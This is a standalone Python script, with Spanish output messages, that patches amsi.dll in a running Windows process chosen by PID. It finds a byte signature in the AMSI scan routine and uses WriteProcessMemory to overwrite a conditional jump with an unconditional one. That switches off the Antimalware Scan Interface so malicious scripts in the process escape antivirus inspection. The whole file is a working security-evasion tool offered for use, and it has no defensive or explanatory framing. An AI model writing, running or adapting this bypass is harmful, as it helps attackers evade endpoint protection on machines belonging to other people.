import ctypes
import sys
from ctypes import wintypes

const = {
    "vmoperation": 0x0008,
    "vmread": 0x0010,
    "vmwrite": 0x0020,
}

patch = bytes([0xEB])

class MODULEENTRY32(ctypes.Structure):
    _fields_ = [
        ('dwSize', wintypes.DWORD),
        ('th32ModuleID', wintypes.DWORD),
        ('th32ProcessID', wintypes.DWORD),
        ('GlblcntUsage', wintypes.DWORD),
        ('ProccntUsage', wintypes.DWORD),
        ('modBaseAddr', ctypes.POINTER(ctypes.c_byte)),
        ('modBaseSize', wintypes.DWORD),
        ('hModule', wintypes.HMODULE),
        ('szModule', ctypes.c_char * 256),
        ('szExePath', ctypes.c_char * wintypes.MAX_PATH)
    ]

def get_module_base_address(pid, module_name):
    hModuleSnap = ctypes.windll.kernel32.CreateToolhelp32Snapshot(0x00000008, pid)
    me32 = MODULEENTRY32()
    me32.dwSize = ctypes.sizeof(MODULEENTRY32)

    if ctypes.windll.kernel32.Module32First(hModuleSnap, ctypes.byref(me32)) == 0:
        ctypes.windll.kernel32.CloseHandle(hModuleSnap)
        return None

    while True:
        if me32.szModule.decode("utf-8") == module_name:
            ctypes.windll.kernel32.CloseHandle(hModuleSnap)
            return me32.modBaseAddr

        if ctypes.windll.kernel32.Module32Next(hModuleSnap, ctypes.byref(me32)) == 0:
            break

    ctypes.windll.kernel32.CloseHandle(hModuleSnap)
    return None

def SPatt(startaddr, pattern):
    patsiz = len(pattern)
    for i in range(len(startaddr)):
        if startaddr[i] == pattern[0]:
            j = 1
            while j < patsiz and (pattern[j] == '?' or startaddr[i + j] == pattern[j]):
                j += 1
            if j == patsiz:
                return i
    return -1

def PatchProcess(pid):
    pattern = bytes([0x48, 0x85, 0xD2, 0x74, 0x3F, 0x48, 0x85, 0xC9, 0x74, 0x3A, 0x48, 0x83, 0x79, 0x08, 0x00, 0x74, 0x33])
    patch = bytes([0xEB])

    base_address = get_module_base_address(pid, "amsi.dll")
    if not base_address:
        print(f"No se pudo obtener la dirección base de amsi.dll en el proceso {pid}")
        return -1

    base_address_value = base_address.contents.value if isinstance(base_address, ctypes.POINTER(ctypes.c_byte)) else base_address

    print(f"Dirección base de amsi.dll en el proceso {pid}: {base_address_value}")

    prochandl = ctypes.windll.kernel32.OpenProcess(
        const["vmoperation"] | const["vmread"] | const["vmwrite"],
        False, pid
    )
    if not prochandl:
        print(f"No se pudo abrir el proceso {pid}. Error: {ctypes.windll.kernel32.GetLastError()}")
        return -1

    size = 0x1000
    buffer = ctypes.create_string_buffer(size)
    bytesRead = ctypes.c_size_t(0)

    addr = ctypes.c_uint64(base_address_value)
    total_size = 0x10000  

    while total_size > 0:
        if ctypes.windll.kernel32.ReadProcessMemory(prochandl, addr, buffer, size, ctypes.byref(bytesRead)):
            pattern_offset = SPatt(buffer.raw, pattern)
            if pattern_offset != -1:
                patch_address = addr.value + pattern_offset + 3
                print(f"Dirección a parchear: {patch_address}")
                
                written = ctypes.c_size_t(0)
                if ctypes.windll.kernel32.WriteProcessMemory(prochandl, ctypes.c_uint64(patch_address), patch, len(patch), ctypes.byref(written)):
                    print(f"Parche aplicado correctamente en el proceso {pid} en la dirección {patch_address}")
                else:
                    error_code = ctypes.windll.kernel32.GetLastError()
                    print(f"Error aplicando el parche en el proceso {pid}. Error: {error_code}")
                break
        else:
            error_code = ctypes.windll.kernel32.GetLastError()
            print(f"Error leyendo la memoria en la dirección {addr.value}. Error: {error_code}")

        addr.value += size
        total_size -= size

    ctypes.windll.kernel32.CloseHandle(prochandl)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: patcher.py <pid>")
        sys.exit(1)

    pid = int(sys.argv[1])
    PatchProcess(pid)
